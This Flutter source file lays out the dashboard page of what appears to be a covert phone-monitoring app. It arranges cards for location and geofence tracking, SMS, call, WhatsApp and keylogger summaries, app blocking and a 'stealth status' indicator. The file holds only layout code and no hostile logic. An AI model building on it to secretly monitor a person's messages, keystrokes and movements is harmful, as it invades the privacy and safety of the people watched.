import 'package:flutter/material.dart';
import './dash/geofence_card.dart';
import './dash/sms_summary_card.dart';
import './dash/call_summary_card.dart';
import './dash/whatsapp_summary_card.dart';
import './dash/keylogger_summary_card.dart';
import './dash/total_installed_apps_card.dart';
import './dash/blocked_apps_count_card.dart';
import './dash/stealth_status_card.dart';
import './dash/min_map.dart';

class DashboardPage extends StatefulWidget {
  final String username;
  final Function(int) onJumpToIndex;

  const DashboardPage({
    super.key,
    required this.username,
    required this.onJumpToIndex,
  });

  @override
  State<DashboardPage> createState() => _DashboardPageState();
}

class _DashboardPageState extends State<DashboardPage> {
  int _totalModules = 9;
  int _loadedModules = 0;
  bool get _allModulesLoaded => _loadedModules >= _totalModules;

  void _onModuleLoaded() {
    setState(() {
      _loadedModules++;
    });
  }

  @override
  Widget build(BuildContext context) {
    return LayoutBuilder(
      builder: (context, constraints) {
        final isWideScreen = constraints.maxWidth > 800;

        return Stack(
          children: [
            SingleChildScrollView(
              padding: const EdgeInsets.all(16),
              child: Column(
                children: [
                  isWideScreen
                      ? Row(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Expanded(
                            flex: 3,
                            child: _wrapCard(
                              SizedBox(
                                height: 300,
                                child: LocationMapCard(
                                  username: widget.username,
                                  onJumpToIndex: widget.onJumpToIndex,
                                  onModuleLoaded: _onModuleLoaded,
                                ),
                              ),
                            ),
                          ),
                          const SizedBox(width: 16),
                          Expanded(
                            flex: 1,
                            child: _wrapCard(
                              SizedBox(
                                height: 300,
                                child: GeofenceCard(
                                  userId: widget.username,
                                  onJumpToIndex: widget.onJumpToIndex,
                                  onModuleLoaded: _onModuleLoaded,
                                ),
                              ),
                            ),
                          ),
                        ],
                      )
                      : Column(
                        children: [
                          _wrapCard(
                            SizedBox(
                              height: 300,
                              child: LocationMapCard(
                                username: widget.username,
                                onJumpToIndex: widget.onJumpToIndex,
                                onModuleLoaded: _onModuleLoaded,
                              ),
                            ),
                          ),
                          const SizedBox(height: 16),
                          _wrapCard(
                            GeofenceCard(
                              userId: widget.username,
                              onJumpToIndex: widget.onJumpToIndex,
                              onModuleLoaded: _onModuleLoaded,
                            ),
                          ),
                        ],
                      ),
                  const SizedBox(height: 20),
                  isWideScreen
                      ? IntrinsicHeight(
                        child: Row(
                          crossAxisAlignment: CrossAxisAlignment.stretch,
                          children: [
                            Expanded(
                              child: _wrapCard(
                                SmsSummaryCard(
                                  username: widget.username,
                                  onJumpToIndex: widget.onJumpToIndex,
                                  onModuleLoaded: _onModuleLoaded,
                                ),
                              ),
                            ),
                            const SizedBox(width: 16),
                            Expanded(
                              child: _wrapCard(
                                CallSummaryCard(
                                  username: widget.username,
                                  onJumpToIndex: widget.onJumpToIndex,
                                  onModuleLoaded: _onModuleLoaded,
                                ),
                              ),
                            ),
                          ],
                        ),
                      )
                      : Column(
                        children: [
                          _wrapCard(
                            SmsSummaryCard(
                              username: widget.username,
                              onJumpToIndex: widget.onJumpToIndex,
                              onModuleLoaded: _onModuleLoaded,
                            ),
                          ),
                          const SizedBox(height: 16),
                          _wrapCard(
                            CallSummaryCard(
                              username: widget.username,
                              onJumpToIndex: widget.onJumpToIndex,
                              onModuleLoaded: _onModuleLoaded,
                            ),
                          ),
                        ],
                      ),
                  const SizedBox(height: 20),
                  isWideScreen
                      ? IntrinsicHeight(
                        child: Row(
                          crossAxisAlignment: CrossAxisAlignment.stretch,
                          children: [
                            Expanded(
                              child: _wrapCard(
                                WhatsAppSummaryCard(
                                  username: widget.username,
                                  onJumpToIndex: widget.onJumpToIndex,
                                  onModuleLoaded: _onModuleLoaded,
                                ),
                              ),
                            ),
                            const SizedBox(width: 16),
                            Expanded(
                              child: _wrapCard(
                                KeyloggerSummaryCard(
                                  userId: widget.username,
                                  onJumpToIndex: widget.onJumpToIndex,
                                  onModuleLoaded: _onModuleLoaded,
                                ),
                              ),
                            ),
                          ],
                        ),
                      )
                      : Column(
                        children: [
                          _wrapCard(
                            WhatsAppSummaryCard(
                              username: widget.username,
                              onJumpToIndex: widget.onJumpToIndex,
                              onModuleLoaded: _onModuleLoaded,
                            ),
                          ),
                          const SizedBox(height: 16),
                          _wrapCard(
                            KeyloggerSummaryCard(
                              userId: widget.username,
                              onJumpToIndex: widget.onJumpToIndex,
                              onModuleLoaded: _onModuleLoaded,
                            ),
                          ),
                        ],
                      ),
                  const SizedBox(height: 20),
                  isWideScreen
                      ? IntrinsicHeight(
                        child: Row(
                          crossAxisAlignment: CrossAxisAlignment.stretch,
                          children: [
                            Expanded(
                              child: _wrapCard(
                                TotalInstalledAppsCard(
                                  username: widget.username,
                                  onJumpToIndex: widget.onJumpToIndex,
                                  onModuleLoaded: _onModuleLoaded,
                                ),
                              ),
                            ),
                            const SizedBox(width: 16),
                            Expanded(
                              child: _wrapCard(
                                BlockedAppsCountCard(
                                  username: widget.username,
                                  onJumpToIndex: widget.onJumpToIndex,
                                  onModuleLoaded: _onModuleLoaded,
                                ),
                              ),
                            ),
                            const SizedBox(width: 16),
                            Expanded(
                              child: _wrapCard(
                                StealthStatusCard(
                                  username: widget.username,
                                  onJumpToIndex: widget.onJumpToIndex,
                                  onModuleLoaded: _onModuleLoaded,
                                ),
                              ),
                            ),
                          ],
                        ),
                      )
                      : Column(
                        children: [
                          _wrapCard(
                            TotalInstalledAppsCard(
                              username: widget.username,
                              onJumpToIndex: widget.onJumpToIndex,
                              onModuleLoaded: _onModuleLoaded,
                            ),
                          ),
                          const SizedBox(height: 20),
                          _wrapCard(
                            BlockedAppsCountCard(
                              username: widget.username,
                              onJumpToIndex: widget.onJumpToIndex,
                              onModuleLoaded: _onModuleLoaded,
                            ),
                          ),
                          const SizedBox(height: 20),
                          SizedBox(
                            width: double.infinity,
                            child: ConstrainedBox(
                              constraints: const BoxConstraints(minHeight: 200),
                              child: Container(
                                padding: const EdgeInsets.all(8),
                                decoration: BoxDecoration(
                                  color:
                                      Theme.of(context).scaffoldBackgroundColor,
                                  borderRadius: BorderRadius.circular(12),
                                ),
                                child: StealthStatusCard(
                                  username: widget.username,
                                  onJumpToIndex: widget.onJumpToIndex,
                                  onModuleLoaded: _onModuleLoaded,
                                ),
                              ),
                            ),
                          ),
                        ],
                      ),
                  const SizedBox(height: 20),
                ],
              ),
            ),

            // Loader
            AnimatedOpacity(
              opacity: _allModulesLoaded ? 0.0 : 1.0,
              duration: const Duration(milliseconds: 500),
              curve: Curves.easeInOut,
              child: IgnorePointer(
                ignoring: _allModulesLoaded,
                child: AnimatedContainer(
                  duration: const Duration(milliseconds: 300),
                  color: Theme.of(context).scaffoldBackgroundColor,
                  alignment: Alignment.center,
                  child: Column(
                    mainAxisSize: MainAxisSize.min,
                    children: const [_RotatingIcon(), SizedBox(height: 20)],
                  ),
                ),
              ),
            ),
          ],
        );
      },
    );
  }

  Widget _wrapCard(Widget child) {
    return ConstrainedBox(
      constraints: const BoxConstraints(minHeight: 200),
      child: Container(
        padding: const EdgeInsets.all(8),
        decoration: BoxDecoration(
          color: Theme.of(context).cardColor,
          borderRadius: BorderRadius.circular(12),
        ),
        child: DefaultTextStyle.merge(
          style: const TextStyle(fontFamily: 'NexaBold'),
          child: child,
        ),
      ),
    );
  }
}

class _RotatingIcon extends StatefulWidget {
  const _RotatingIcon({Key? key}) : super(key: key);

  @override
  State<_RotatingIcon> createState() => _RotatingIconState();
}

class _RotatingIconState extends State<_RotatingIcon>
    with SingleTickerProviderStateMixin {
  late final AnimationController _controller;

  @override
  void initState() {
    super.initState();
    _controller = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 2),
    )..repeat();
  }

  @override
  void dispose() {
    _controller.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    final iconColor =
        Theme.of(context).brightness == Brightness.dark
            ? Colors.white
            : Colors.blueAccent;

    return AnimatedBuilder(
      animation: _controller,
      child: Icon(Icons.dashboard, size: 80, color: iconColor),
      builder: (context, child) {
        return Transform.rotate(
          angle: _controller.value * 2 * 3.14159,
          child: child,
        );
      },
    );
  }
}